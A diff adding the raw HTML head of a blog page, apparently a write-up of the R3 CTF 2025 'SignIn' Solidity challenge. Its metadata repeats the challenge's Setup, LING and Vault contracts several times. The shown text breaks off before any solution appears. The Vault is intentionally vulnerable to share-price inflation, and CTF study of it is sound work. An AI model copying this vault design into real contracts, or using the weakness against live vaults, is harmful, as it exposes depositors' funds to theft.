@@ -1,0 +1,704 @@
+<style>pre{position:relative;padding-top:1.5em}.copy-button{position:absolute;top:8px;right:8px;padding:4px 8px;font-size:12px;background-color:#555;color:#fff;border:none;border-radius:4px;cursor:pointer;opacity:.8;transition:opacity .3s,background-color .3s}.copy-button:hover{opacity:1;background-color:#333}.copy-button:active{background-color:#222}</style><!doctype html><html class=position-relative itemscope itemtype=https://schema.org/WebPage lang=en data-bs-theme=auto data-palette=blue><head><script src=/assets/init/bundle.min.5d926f39b9560d169df61400c683a4a6bf98ae34435563467342e88a51e66b49.js integrity="sha256-XZJvOblWDRad9hQAxoOkpr+YrjRDVWNGc0LoilHma0k=" crossorigin=anonymous></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Signin - S4b03ur's Website</title><link rel=icon href=/favicon_hu_b34762d1804ef570.png sizes=16x16 type=image/png><link rel=icon href=/favicon_hu_232ee76de806a9fb.png sizes=32x32 type=image/png><link rel=icon href=/favicon_hu_87b8209e5c029d7f.png sizes=150x150 type=image/png><link rel=apple-touch-icon href=/favicon_hu_471014c70a45ada4.png sizes=180x180 type=image/png><link rel=icon href=/favicon_hu_cd126433966a366f.png sizes=192x192 type=image/png><link rel=mask-icon href=/safari-pinned-tab.svg color=#6f42c1><meta name=keywords content><meta name=description content='Writeup for SignIn
+
+Challenge Description
+In the world of digital currencies, every transaction holds secrets, and every vault has its own story&mldr;
+Author: zeroc
+
+The Challenge
+The below are source contracts
+
+Setup contract
+
+ 1// SPDX-License-Identifier: MIT
+ 2pragma solidity ^0.8.20;
+ 3
+ 4import {Vault} from "./Vault.sol";
+ 5import {LING} from "./LING.sol";
+ 6
+ 7contract Setup {
+ 8    Vault public vault;
+ 9    LING public ling;
+10    bool public claimed;
+11    bool public solved;
+12    constructor() {
+13        ling = new LING(1000 ether);
+14        vault = new Vault(ling);
+15    }
+16
+17    function claim() external {
+18        if (claimed) {
+19            revert("Already claimed");
+20        }
+21        claimed = true;
+22        ling.transfer(msg.sender, 1 ether);
+23    }
+24
+25    function solve() external {
+26        ling.approve(address(vault), 999 ether);
+27        vault.deposit(999 ether, address(this));
+28        if (vault.balanceOf(address(this)) >= 500 ether) {
+29            revert("Challenge not solved yet");
+30        }
+31        solved = true;
+32    }
+33
+34    function isSolved() public view returns (bool) {
+35        return solved;
+36    }
+37}
+
+LING contract
+
+ 1//SPDX-License-Identifier:MIT
+ 2pragma solidity ^0.8.0;
+ 3
+ 4import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol";
+ 5
+ 6contract LING is ERC20 {
+ 7    constructor(uint256 _initialSupply) ERC20("LING", "LING") {
+ 8        _mint(msg.sender, _initialSupply);
+ 9    }
+10}
+
+Vault contract
+
+  1// SPDX-License-Identifier: MIT
+  2pragma solidity ^0.8.20;
+  3
+  4import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol";
+  5import {Ownable} from "@signin/openzeppelin/contracts/access/Ownable.sol";
+  6import {IERC4626} from "@signin/openzeppelin/contracts/interfaces/IERC4626.sol";
+  7import {LING} from "./LING.sol";
+  8
+  9contract Vault is Ownable, IERC4626, ERC20("LING VAULT", "vLING") {
+ 10    struct VaultAccount {
+ 11        uint256 amount;
+ 12        uint256 shares;
+ 13    }
+ 14
+ 15    VaultAccount public totalAsset;
+ 16    LING ling;
+ 17    mapping(address => uint256) public borrowedAssets;
+ 18    uint256 public totalBorrowedAssets;
+ 19
+ 20    constructor(LING _ling) Ownable(msg.sender) {
+ 21        ling = _ling;
+ 22    }
+ 23
+ 24    function asset() external view returns (address assetTokenAddress) {
+ 25        assetTokenAddress = address(ling);
+ 26    }
+ 27
+ 28    function totalAssets() public view returns (uint256 totalManagedAssets) {
+ 29        totalManagedAssets = totalAsset.amount - totalBorrowedAssets;
+ 30    }
+ 31
+ 32    function convertToShares(
+ 33        uint256 assets
+ 34    ) public view returns (uint256 shares) {
+ 35        if (totalAsset.amount == 0) {
+ 36            shares = assets;
+ 37        } else {
+ 38            shares = (assets * totalAsset.shares) / totalAsset.amount;
+ 39        }
+ 40    }
+ 41
+ 42    function convertToAssets(
+ 43        uint256 shares
+ 44    ) public view returns (uint256 assets) {
+ 45        if (totalAsset.shares == 0) {
+ 46            assets = shares;
+ 47        } else {
+ 48            assets = (shares * totalAsset.amount) / totalAsset.shares;
+ 49        }
+ 50    }
+ 51
+ 52    function maxDeposit(
+ 53        address /* receiver */
+ 54    ) public pure returns (uint256 maxAssets) {
+ 55        return type(uint256).max;
+ 56    }
+ 57
+ 58    function previewDeposit(
+ 59        uint256 assets
+ 60    ) external view returns (uint256 shares) {
+ 61        shares = convertToShares(assets);
+ 62    }
+ 63
+ 64    function deposit(
+ 65        uint256 assets,
+ 66        address receiver
+ 67    ) external returns (uint256) {
+ 68        if (assets == 0) {
+ 69            revert("zero assets");
+ 70        }
+ 71        uint256 shares = convertToShares(assets);
+ 72
+ 73        totalAsset.amount += assets;
+ 74        totalAsset.shares += shares;
+ 75        ling.transferFrom(msg.sender, address(this), assets);
+ 76        _mint(receiver, shares);
+ 77
+ 78        emit Deposit(msg.sender, receiver, assets, shares);
+ 79        return shares;
+ 80    }
+ 81
+ 82    function maxMint(
+ 83        address /* receiver */
+ 84    ) external pure returns (uint256 maxShares) {
+ 85        return type(uint256).max;
+ 86    }
+ 87
+ 88    function previewMint(
+ 89        uint256 shares
+ 90    ) external view returns (uint256 assets) {
+ 91        assets = convertToAssets(shares);
+ 92    }
+ 93
+ 94    function mint(
+ 95        uint256 shares,
+ 96        address receiver
+ 97    ) external returns (uint256 assets) {
+ 98        if (shares == 0) {
+ 99            revert("zero shares");
+100        }
+101        assets = convertToAssets(shares);
+102
+103        totalAsset.amount += assets;
+104        totalAsset.shares += shares;
+105        ling.transferFrom(msg.sender, address(this), assets);
+106        _mint(receiver, shares);
+107
+108        emit Deposit(msg.sender, receiver, assets, shares);
+109        return assets;
+110    }
+111
+112    function maxWithdraw(
+113        address owner
+114    ) external view returns (uint256 maxAssets) {
+115        uint256 shares = balanceOf(owner);
+116        maxAssets = convertToAssets(shares);
+117    }
+118
+119    function previewWithdraw(
+120        uint256 assets
+121    ) external view returns (uint256 shares) {
+122        shares = convertToShares(assets);
+123    }
+124
+125    function withdraw(
+126        uint256 assets,
+127        address receiver,
+128        address owner
+129    ) external returns (uint256 shares) {
+130        if (assets == 0) {
+131            revert("zero assets");
+132        }
+133        shares = convertToShares(assets);
+134        if (shares > balanceOf(owner)) {
+135            revert("insufficient shares");
+136        }
+137
+138        if (msg.sender != owner) {
+139            uint256 allowed = allowance(owner, msg.sender);
+140            if (allowed < shares) {
+141                revert("insufficient allowance");
+142            }
+143            _approve(owner, msg.sender, allowed - shares);
+144        }
+145
+146        _burn(owner, shares);
+147        totalAsset.amount -= assets;
+148        totalAsset.shares -= shares;
+149        ling.transfer(receiver, assets);
+150
+151        emit Withdraw(msg.sender, receiver, owner, assets, shares);
+152        return shares;
+153    }
+154
+155    function maxRedeem(
+156        address owner
+157    ) external view returns (uint256 maxShares) {
+158        return balanceOf(owner);
+159    }
+160
+161    function previewRedeem(
+162        uint256 shares
+163    ) external view returns (uint256 assets) {
+164        assets = convertToAssets(shares);
+165    }
+166
+167    function redeem(
+168        uint256 shares,
+169        address receiver,
+170        address owner
+171    ) external returns (uint256 assets) {
+172        if (shares > balanceOf(owner)) {
+173            revert("insufficient shares");
+174        }
+175        assets = convertToAssets(shares);
+176
+177        if (msg.sender != owner) {
+178            uint256 allowed = allowance(owner, msg.sender);
+179            if (allowed < shares) {
+180                revert("insufficient allowance");
+181            }
+182            _approve(owner, msg.sender, allowed - shares);
+183        }
+184
+185        _burn(owner, shares);
+186        totalAsset.amount -= assets;
+187        totalAsset.shares -= shares;
+188        ling.transfer(receiver, assets);
+189
+190        emit Withdraw(msg.sender, receiver, owner, assets, shares);
+191        return assets;
+192    }
+193
+194    function borrowAssets(uint256 amount) external {
+195        if (amount == 0) {
+196            revert("zero amount");
+197        }
+198        if (amount > totalAssets()) {
+199            revert("insufficient balance");
+200        }
+201        borrowedAssets[msg.sender] += amount;
+202        totalBorrowedAssets += amount;
+203        ling.transfer(msg.sender, amount);
+204    }
+205
+206    function repayAssets(uint256 amount) external {
+207        if (amount == 0) {
+208            revert("zero amount");
+209        }
+210        if (borrowedAssets[msg.sender] < amount) {
+211            revert("invalid amount");
+212        }
+213        uint256 fee = (amount * 1) / 100;
+214        borrowedAssets[msg.sender] -= amount;
+215        totalBorrowedAssets -= amount;
+216        totalAsset.amount += fee;
+217        ling.transferFrom(msg.sender, address(this), amount + fee);
+218    }
+219}
+1    function solve() external {
+2        ling.approve(address(vault), 999 ether);
+3        vault.deposit(999 ether, address(this));
+4        if (vault.balanceOf(address(this)) >= 500 ether) {
+5            revert("Challenge not solved yet");
+6        }
+7        solved = true;
+8    }
+Our goal is to make the Setup::isSolved function return true. This function returns true if the solved variable is set to true. We can set solved to true by calling Setup::solve. The Setup::solve function attempts to deposit 999e18 LING tokens into the vault. If, during this deposit, the number of shares received by the Setup contract is less than 500 ether, the solved variable will be set to true.'><meta name=twitter:card content="summary"><meta name=twitter:title content="Signin"><meta name=twitter:description content='Writeup for SignIn Challenge Description In the world of digital currencies, every transaction holds secrets, and every vault has its own story…
+Author: zeroc
+The Challenge The below are source contracts
+Setup contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.20; 3 4import {Vault} from "./Vault.sol"; 5import {LING} from "./LING.sol"; 6 7contract Setup { 8 Vault public vault; 9 LING public ling; 10 bool public claimed; 11 bool public solved; 12 constructor() { 13 ling = new LING(1000 ether); 14 vault = new Vault(ling); 15 } 16 17 function claim() external { 18 if (claimed) { 19 revert("Already claimed"); 20 } 21 claimed = true; 22 ling.transfer(msg.sender, 1 ether); 23 } 24 25 function solve() external { 26 ling.approve(address(vault), 999 ether); 27 vault.deposit(999 ether, address(this)); 28 if (vault.balanceOf(address(this)) >= 500 ether) { 29 revert("Challenge not solved yet"); 30 } 31 solved = true; 32 } 33 34 function isSolved() public view returns (bool) { 35 return solved; 36 } 37} LING contract 1//SPDX-License-Identifier:MIT 2pragma solidity ^0.8.0; 3 4import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol"; 5 6contract LING is ERC20 { 7 constructor(uint256 _initialSupply) ERC20("LING", "LING") { 8 _mint(msg.sender, _initialSupply); 9 } 10} Vault contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.20; 3 4import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol"; 5import {Ownable} from "@signin/openzeppelin/contracts/access/Ownable.sol"; 6import {IERC4626} from "@signin/openzeppelin/contracts/interfaces/IERC4626.sol"; 7import {LING} from "./LING.sol"; 8 9contract Vault is Ownable, IERC4626, ERC20("LING VAULT", "vLING") { 10 struct VaultAccount { 11 uint256 amount; 12 uint256 shares; 13 } 14 15 VaultAccount public totalAsset; 16 LING ling; 17 mapping(address => uint256) public borrowedAssets; 18 uint256 public totalBorrowedAssets; 19 20 constructor(LING _ling) Ownable(msg.sender) { 21 ling = _ling; 22 } 23 24 function asset() external view returns (address assetTokenAddress) { 25 assetTokenAddress = address(ling); 26 } 27 28 function totalAssets() public view returns (uint256 totalManagedAssets) { 29 totalManagedAssets = totalAsset.amount - totalBorrowedAssets; 30 } 31 32 function convertToShares( 33 uint256 assets 34 ) public view returns (uint256 shares) { 35 if (totalAsset.amount == 0) { 36 shares = assets; 37 } else { 38 shares = (assets * totalAsset.shares) / totalAsset.amount; 39 } 40 } 41 42 function convertToAssets( 43 uint256 shares 44 ) public view returns (uint256 assets) { 45 if (totalAsset.shares == 0) { 46 assets = shares; 47 } else { 48 assets = (shares * totalAsset.amount) / totalAsset.shares; 49 } 50 } 51 52 function maxDeposit( 53 address /* receiver */ 54 ) public pure returns (uint256 maxAssets) { 55 return type(uint256).max; 56 } 57 58 function previewDeposit( 59 uint256 assets 60 ) external view returns (uint256 shares) { 61 shares = convertToShares(assets); 62 } 63 64 function deposit( 65 uint256 assets, 66 address receiver 67 ) external returns (uint256) { 68 if (assets == 0) { 69 revert("zero assets"); 70 } 71 uint256 shares = convertToShares(assets); 72 73 totalAsset.amount += assets; 74 totalAsset.shares += shares; 75 ling.transferFrom(msg.sender, address(this), assets); 76 _mint(receiver, shares); 77 78 emit Deposit(msg.sender, receiver, assets, shares); 79 return shares; 80 } 81 82 function maxMint( 83 address /* receiver */ 84 ) external pure returns (uint256 maxShares) { 85 return type(uint256).max; 86 } 87 88 function previewMint( 89 uint256 shares 90 ) external view returns (uint256 assets) { 91 assets = convertToAssets(shares); 92 } 93 94 function mint( 95 uint256 shares, 96 address receiver 97 ) external returns (uint256 assets) { 98 if (shares == 0) { 99 revert("zero shares"); 100 } 101 assets = convertToAssets(shares); 102 103 totalAsset.amount += assets; 104 totalAsset.shares += shares; 105 ling.transferFrom(msg.sender, address(this), assets); 106 _mint(receiver, shares); 107 108 emit Deposit(msg.sender, receiver, assets, shares); 109 return assets; 110 } 111 112 function maxWithdraw( 113 address owner 114 ) external view returns (uint256 maxAssets) { 115 uint256 shares = balanceOf(owner); 116 maxAssets = convertToAssets(shares); 117 } 118 119 function previewWithdraw( 120 uint256 assets 121 ) external view returns (uint256 shares) { 122 shares = convertToShares(assets); 123 } 124 125 function withdraw( 126 uint256 assets, 127 address receiver, 128 address owner 129 ) external returns (uint256 shares) { 130 if (assets == 0) { 131 revert("zero assets"); 132 } 133 shares = convertToShares(assets); 134 if (shares > balanceOf(owner)) { 135 revert("insufficient shares"); 136 } 137 138 if (msg.sender != owner) { 139 uint256 allowed = allowance(owner, msg.sender); 140 if (allowed < shares) { 141 revert("insufficient allowance"); 142 } 143 _approve(owner, msg.sender, allowed - shares); 144 } 145 146 _burn(owner, shares); 147 totalAsset.amount -= assets; 148 totalAsset.shares -= shares; 149 ling.transfer(receiver, assets); 150 151 emit Withdraw(msg.sender, receiver, owner, assets, shares); 152 return shares; 153 } 154 155 function maxRedeem( 156 address owner 157 ) external view returns (uint256 maxShares) { 158 return balanceOf(owner); 159 } 160 161 function previewRedeem( 162 uint256 shares 163 ) external view returns (uint256 assets) { 164 assets = convertToAssets(shares); 165 } 166 167 function redeem( 168 uint256 shares, 169 address receiver, 170 address owner 171 ) external returns (uint256 assets) { 172 if (shares > balanceOf(owner)) { 173 revert("insufficient shares"); 174 } 175 assets = convertToAssets(shares); 176 177 if (msg.sender != owner) { 178 uint256 allowed = allowance(owner, msg.sender); 179 if (allowed < shares) { 180 revert("insufficient allowance"); 181 } 182 _approve(owner, msg.sender, allowed - shares); 183 } 184 185 _burn(owner, shares); 186 totalAsset.amount -= assets; 187 totalAsset.shares -= shares; 188 ling.transfer(receiver, assets); 189 190 emit Withdraw(msg.sender, receiver, owner, assets, shares); 191 return assets; 192 } 193 194 function borrowAssets(uint256 amount) external { 195 if (amount == 0) { 196 revert("zero amount"); 197 } 198 if (amount > totalAssets()) { 199 revert("insufficient balance"); 200 } 201 borrowedAssets[msg.sender] += amount; 202 totalBorrowedAssets += amount; 203 ling.transfer(msg.sender, amount); 204 } 205 206 function repayAssets(uint256 amount) external { 207 if (amount == 0) { 208 revert("zero amount"); 209 } 210 if (borrowedAssets[msg.sender] < amount) { 211 revert("invalid amount"); 212 } 213 uint256 fee = (amount * 1) / 100; 214 borrowedAssets[msg.sender] -= amount; 215 totalBorrowedAssets -= amount; 216 totalAsset.amount += fee; 217 ling.transferFrom(msg.sender, address(this), amount + fee); 218 } 219} 1 function solve() external { 2 ling.approve(address(vault), 999 ether); 3 vault.deposit(999 ether, address(this)); 4 if (vault.balanceOf(address(this)) >= 500 ether) { 5 revert("Challenge not solved yet"); 6 } 7 solved = true; 8 } Our goal is to make the Setup::isSolved function return true. This function returns true if the solved variable is set to true. We can set solved to true by calling Setup::solve. The Setup::solve function attempts to deposit 999e18 LING tokens into the vault. If, during this deposit, the number of shares received by the Setup contract is less than 500 ether, the solved variable will be set to true.'><meta name=twitter:site content="@s4bot3ur"><meta property="og:url" content="https://s4bot3ur.github.io/blogs/r3-ctf-2025/signin/"><meta property="og:site_name" content="S4b03ur's Website"><meta property="og:title" content="Signin"><meta property="og:description" content='Writeup for SignIn Challenge Description In the world of digital currencies, every transaction holds secrets, and every vault has its own story…
+Author: zeroc
+The Challenge The below are source contracts
+Setup contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.20; 3 4import {Vault} from "./Vault.sol"; 5import {LING} from "./LING.sol"; 6 7contract Setup { 8 Vault public vault; 9 LING public ling; 10 bool public claimed; 11 bool public solved; 12 constructor() { 13 ling = new LING(1000 ether); 14 vault = new Vault(ling); 15 } 16 17 function claim() external { 18 if (claimed) { 19 revert("Already claimed"); 20 } 21 claimed = true; 22 ling.transfer(msg.sender, 1 ether); 23 } 24 25 function solve() external { 26 ling.approve(address(vault), 999 ether); 27 vault.deposit(999 ether, address(this)); 28 if (vault.balanceOf(address(this)) >= 500 ether) { 29 revert("Challenge not solved yet"); 30 } 31 solved = true; 32 } 33 34 function isSolved() public view returns (bool) { 35 return solved; 36 } 37} LING contract 1//SPDX-License-Identifier:MIT 2pragma solidity ^0.8.0; 3 4import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol"; 5 6contract LING is ERC20 { 7 constructor(uint256 _initialSupply) ERC20("LING", "LING") { 8 _mint(msg.sender, _initialSupply); 9 } 10} Vault contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.20; 3 4import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol"; 5import {Ownable} from "@signin/openzeppelin/contracts/access/Ownable.sol"; 6import {IERC4626} from "@signin/openzeppelin/contracts/interfaces/IERC4626.sol"; 7import {LING} from "./LING.sol"; 8 9contract Vault is Ownable, IERC4626, ERC20("LING VAULT", "vLING") { 10 struct VaultAccount { 11 uint256 amount; 12 uint256 shares; 13 } 14 15 VaultAccount public totalAsset; 16 LING ling; 17 mapping(address => uint256) public borrowedAssets; 18 uint256 public totalBorrowedAssets; 19 20 constructor(LING _ling) Ownable(msg.sender) { 21 ling = _ling; 22 } 23 24 function asset() external view returns (address assetTokenAddress) { 25 assetTokenAddress = address(ling); 26 } 27 28 function totalAssets() public view returns (uint256 totalManagedAssets) { 29 totalManagedAssets = totalAsset.amount - totalBorrowedAssets; 30 } 31 32 function convertToShares( 33 uint256 assets 34 ) public view returns (uint256 shares) { 35 if (totalAsset.amount == 0) { 36 shares = assets; 37 } else { 38 shares = (assets * totalAsset.shares) / totalAsset.amount; 39 } 40 } 41 42 function convertToAssets( 43 uint256 shares 44 ) public view returns (uint256 assets) { 45 if (totalAsset.shares == 0) { 46 assets = shares; 47 } else { 48 assets = (shares * totalAsset.amount) / totalAsset.shares; 49 } 50 } 51 52 function maxDeposit( 53 address /* receiver */ 54 ) public pure returns (uint256 maxAssets) { 55 return type(uint256).max; 56 } 57 58 function previewDeposit( 59 uint256 assets 60 ) external view returns (uint256 shares) { 61 shares = convertToShares(assets); 62 } 63 64 function deposit( 65 uint256 assets, 66 address receiver 67 ) external returns (uint256) { 68 if (assets == 0) { 69 revert("zero assets"); 70 } 71 uint256 shares = convertToShares(assets); 72 73 totalAsset.amount += assets; 74 totalAsset.shares += shares; 75 ling.transferFrom(msg.sender, address(this), assets); 76 _mint(receiver, shares); 77 78 emit Deposit(msg.sender, receiver, assets, shares); 79 return shares; 80 } 81 82 function maxMint( 83 address /* receiver */ 84 ) external pure returns (uint256 maxShares) { 85 return type(uint256).max; 86 } 87 88 function previewMint( 89 uint256 shares 90 ) external view returns (uint256 assets) { 91 assets = convertToAssets(shares); 92 } 93 94 function mint( 95 uint256 shares, 96 address receiver 97 ) external returns (uint256 assets) { 98 if (shares == 0) { 99 revert("zero shares"); 100 } 101 assets = convertToAssets(shares); 102 103 totalAsset.amount += assets; 104 totalAsset.shares += shares; 105 ling.transferFrom(msg.sender, address(this), assets); 106 _mint(receiver, shares); 107 108 emit Deposit(msg.sender, receiver, assets, shares); 109 return assets; 110 } 111 112 function maxWithdraw( 113 address owner 114 ) external view returns (uint256 maxAssets) { 115 uint256 shares = balanceOf(owner); 116 maxAssets = convertToAssets(shares); 117 } 118 119 function previewWithdraw( 120 uint256 assets 121 ) external view returns (uint256 shares) { 122 shares = convertToShares(assets); 123 } 124 125 function withdraw( 126 uint256 assets, 127 address receiver, 128 address owner 129 ) external returns (uint256 shares) { 130 if (assets == 0) { 131 revert("zero assets"); 132 } 133 shares = convertToShares(assets); 134 if (shares > balanceOf(owner)) { 135 revert("insufficient shares"); 136 } 137 138 if (msg.sender != owner) { 139 uint256 allowed = allowance(owner, msg.sender); 140 if (allowed < shares) { 141 revert("insufficient allowance"); 142 } 143 _approve(owner, msg.sender, allowed - shares); 144 } 145 146 _burn(owner, shares); 147 totalAsset.amount -= assets; 148 totalAsset.shares -= shares; 149 ling.transfer(receiver, assets); 150 151 emit Withdraw(msg.sender, receiver, owner, assets, shares); 152 return shares; 153 } 154 155 function maxRedeem( 156 address owner 157 ) external view returns (uint256 maxShares) { 158 return balanceOf(owner); 159 } 160 161 function previewRedeem( 162 uint256 shares 163 ) external view returns (uint256 assets) { 164 assets = convertToAssets(shares); 165 } 166 167 function redeem( 168 uint256 shares, 169 address receiver, 170 address owner 171 ) external returns (uint256 assets) { 172 if (shares > balanceOf(owner)) { 173 revert("insufficient shares"); 174 } 175 assets = convertToAssets(shares); 176 177 if (msg.sender != owner) { 178 uint256 allowed = allowance(owner, msg.sender); 179 if (allowed < shares) { 180 revert("insufficient allowance"); 181 } 182 _approve(owner, msg.sender, allowed - shares); 183 } 184 185 _burn(owner, shares); 186 totalAsset.amount -= assets; 187 totalAsset.shares -= shares; 188 ling.transfer(receiver, assets); 189 190 emit Withdraw(msg.sender, receiver, owner, assets, shares); 191 return assets; 192 } 193 194 function borrowAssets(uint256 amount) external { 195 if (amount == 0) { 196 revert("zero amount"); 197 } 198 if (amount > totalAssets()) { 199 revert("insufficient balance"); 200 } 201 borrowedAssets[msg.sender] += amount; 202 totalBorrowedAssets += amount; 203 ling.transfer(msg.sender, amount); 204 } 205 206 function repayAssets(uint256 amount) external { 207 if (amount == 0) { 208 revert("zero amount"); 209 } 210 if (borrowedAssets[msg.sender] < amount) { 211 revert("invalid amount"); 212 } 213 uint256 fee = (amount * 1) / 100; 214 borrowedAssets[msg.sender] -= amount; 215 totalBorrowedAssets -= amount; 216 totalAsset.amount += fee; 217 ling.transferFrom(msg.sender, address(this), amount + fee); 218 } 219} 1 function solve() external { 2 ling.approve(address(vault), 999 ether); 3 vault.deposit(999 ether, address(this)); 4 if (vault.balanceOf(address(this)) >= 500 ether) { 5 revert("Challenge not solved yet"); 6 } 7 solved = true; 8 } Our goal is to make the Setup::isSolved function return true. This function returns true if the solved variable is set to true. We can set solved to true by calling Setup::solve. The Setup::solve function attempts to deposit 999e18 LING tokens into the vault. If, during this deposit, the number of shares received by the Setup contract is less than 500 ether, the solved variable will be set to true.'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="blogs"><meta property="article:published_time" content="2025-07-16T19:41:06+05:30"><meta property="article:modified_time" content="2025-07-22T23:08:13+05:30"><meta property="article:tag" content="Vault Inflation"><meta itemprop=name content="Signin"><meta itemprop=description content='Writeup for SignIn Challenge Description In the world of digital currencies, every transaction holds secrets, and every vault has its own story…
+Author: zeroc
+The Challenge The below are source contracts
+Setup contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.20; 3 4import {Vault} from "./Vault.sol"; 5import {LING} from "./LING.sol"; 6 7contract Setup { 8 Vault public vault; 9 LING public ling; 10 bool public claimed; 11 bool public solved; 12 constructor() { 13 ling = new LING(1000 ether); 14 vault = new Vault(ling); 15 } 16 17 function claim() external { 18 if (claimed) { 19 revert("Already claimed"); 20 } 21 claimed = true; 22 ling.transfer(msg.sender, 1 ether); 23 } 24 25 function solve() external { 26 ling.approve(address(vault), 999 ether); 27 vault.deposit(999 ether, address(this)); 28 if (vault.balanceOf(address(this)) >= 500 ether) { 29 revert("Challenge not solved yet"); 30 } 31 solved = true; 32 } 33 34 function isSolved() public view returns (bool) { 35 return solved; 36 } 37} LING contract 1//SPDX-License-Identifier:MIT 2pragma solidity ^0.8.0; 3 4import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol"; 5 6contract LING is ERC20 { 7 constructor(uint256 _initialSupply) ERC20("LING", "LING") { 8 _mint(msg.sender, _initialSupply); 9 } 10} Vault contract 1// SPDX-License-Identifier: MIT 2pragma solidity ^0.8.20; 3 4import {ERC20} from "@signin/openzeppelin/contracts/token/ERC20/ERC20.sol"; 5import {Ownable} from "@signin/openzeppelin/contracts/access/Ownable.sol"; 6import {IERC4626} from "@signin/openzeppelin/contracts/interfaces/IERC4626.sol"; 7import {LING} from "./LING.sol"; 8 9contract Vault is Ownable, IERC4626, ERC20("LING VAULT", "vLING") { 10 struct VaultAccount { 11 uint256 amount; 12 uint256 shares; 13 } 14 15 VaultAccount public totalAsset; 16 LING ling; 17 mapping(address => uint256) public borrowedAssets; 18 uint256 public totalBorrowedAssets; 19 20 constructor(LING _ling) Ownable(msg.sender) { 21 ling = _ling; 22 } 23 24 function asset() external view returns (address assetTokenAddress) { 25 assetTokenAddress = address(ling); 26 } 27 28 function totalAssets() public view returns (uint256 totalManagedAssets) { 29 totalManagedAssets = totalAsset.amount - totalBorrowedAssets; 30 } 31 32 function convertToShares( 33 uint256 assets 34 ) public view returns (uint256 shares) { 35 if (totalAsset.amount == 0) { 36 shares = assets; 37 } else { 38 shares = (assets * totalAsset.shares) / totalAsset.amount; 39 } 40 } 41 42 function convertToAssets( 43 uint256 shares 44 ) public view returns (uint256 assets) { 45 if (totalAsset.shares == 0) { 46 assets = shares; 47 } else { 48 assets = (shares * totalAsset.amount) / totalAsset.shares; 49 } 50 } 51 52 function maxDeposit( 53 address /* receiver */ 54 ) public pure returns (uint256 maxAssets) { 55 return type(uint256).max; 56 } 57 58 function previewDeposit( 59 uint256 assets 60 ) external view returns (uint256 shares) { 61 shares = convertToShares(assets); 62 } 63 64 function deposit( 65 uint256 assets, 66 address receiver 67 ) external returns (uint256) { 68 if (assets == 0) { 69 revert("zero assets"); 70 } 71 uint256 shares = convertToShares(assets); 72 73 totalAsset.amount += assets; 74 totalAsset.shares += shares; 75 ling.transferFrom(msg.sender, address(this), assets); 76 _mint(receiver, shares); 77 78 emit Deposit(msg.sender, receiver, assets, shares); 79 return shares; 80 } 81 82 function maxMint( 83 address /* receiver */ 84 ) external pure returns (uint256 maxShares) { 85 return type(uint256).max; 86 } 87 88 function previewMint( 89 uint256 shares 90 ) external view returns (uint256 assets) { 91 assets = convertToAssets(shares); 92 } 93 94 function mint( 95 uint256 shares, 96 address receiver 97 ) external returns (uint256 assets) { 98 if (shares == 0) { 99 revert("zero shares"); 100 } 101 assets = convertToAssets(shares); 102 103 totalAsset.amount += assets; 104 totalAsset.shares += shares; 105 ling.transferFrom(msg.sender, address(this), assets); 106 _mint(receiver, shares); 107 108 emit Deposit(msg.sender, receiver, assets, shares); 109 return assets; 110 } 111 112 function maxWithdraw( 113 address owner 114 ) external view returns (uint256 maxAssets) { 115 uint256 shares = balanceOf(owner); 116 maxAssets = convertToAssets(shares); 117 } 118 119 function previewWithdraw( 120 uint256 assets 121 ) external view returns (uint256 shares) { 122 shares = convertToShares(assets); 123 } 124 125 function withdraw( 126 uint256 assets, 127 address receiver, 128 address owner 129 ) external returns (uint256 shares) { 130 if (assets == 0) { 131 revert("zero assets"); 132 } 133 shares = convertToShares(assets); 134 if (shares > balanceOf(owner)) { 135 revert("insufficient shares"); 136 } 137 138 if (msg.sender != owner) { 139 uint256 allowed = allowance(owner, msg.sender); 140 if (allowed < shares) { 141 revert("insufficient allowance"); 142 } 143 _approve(owner, msg.sender, allowed - shares); 144 } 145 146 _burn(owner, shares); 147 totalAsset.amount -= assets; 148 totalAsset.shares -= shares; 149 ling.transfer(receiver, assets); 150 151 emit Withdraw(msg.sender, receiver, owner, assets, shares); 152 return shares; 153 } 154 155 function maxRedeem( 156 address owner 157 ) external view returns (uint256 maxShares) { 158 return balanceOf(owner); 159 } 160 161 function previewRedeem( 162 uint256 shares 163 ) external view returns (uint256 assets) { 164 assets = convertToAssets(shares); 165 } 166 167 function redeem( 168 uint256 shares, 169 address receiver, 170 address owner 171 ) external returns (uint256 assets) { 172 if (shares > balanceOf(owner)) { 173 revert("insufficient shares"); 174 } 175 assets = convertToAssets(shares); 176 177 if (msg.sender != owner) { 178 uint256 allowed = allowance(owner, msg.sender); 179 if (allowed < shares) { 180 revert("insufficient allowance"); 181 } 182 _approve(owner, msg.sender, allowed - shares); 183 } 184 185 _burn(owner, shares); 186 totalAsset.amount -= assets; 187 totalAsset.shares -= shares; 188 ling.transfer(receiver, assets); 189 190 emit Withdraw(msg.sender, receiver, owner, assets, shares); 191 return assets; 192 } 193 194 function borrowAssets(uint256 amount) external { 195 if (amount == 0) { 196 revert("zero amount"); 197 } 198 if (amount > totalAssets()) { 199 revert("insufficient balance"); 200 } 201 borrowedAssets[msg.sender] += amount; 202 totalBorrowedAssets += amount; 203 ling.transfer(msg.sender, amount); 204 } 205 206 function repayAssets(uint256 amount) external { 207 if (amount == 0) { 208 revert("zero amount"); 209 } 210 if (borrowedAssets[msg.sender] < amount) { 211 revert("invalid amount"); 212 } 213 uint256 fee = (amount * 1) / 100; 214 borrowedAssets[msg.sender] -= amount; 215 totalBorrowedAssets -= amount; 216 totalAsset.amount += fee; 217 ling.transferFrom(msg.sender, address(this), amount + fee); 218 } 219} 1 function solve() external { 2 ling.approve(address(vault), 999 ether); 3 vault.deposit(999 ether, address(this)); 4 if 